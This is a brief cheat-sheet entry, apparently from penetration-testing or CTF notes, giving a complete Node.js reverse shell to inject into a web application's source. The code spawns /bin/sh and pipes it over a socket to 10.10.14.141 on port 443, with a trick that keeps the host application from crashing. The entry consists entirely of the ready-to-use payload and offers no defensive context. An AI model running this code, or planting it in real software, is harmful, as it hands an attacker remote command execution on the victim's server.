# Node.js Webshell

**Node.js web application webshell when you can edit the source of the site**

```javascript
(function(){
	var net = require("net"),
		cp = require("child_process"),
		sh = cp.spawn("/bin/sh", []);
	var client = new net.Socket();
	client.connect(443, "10.10.14.141", function(){
		client.pipe(sh.stdin);
		sh.stdout.pipe(client);
		sh.stderr.pipe(client);
	});
	return /a/; // Prevents the Node.js application form crashing
})();
```
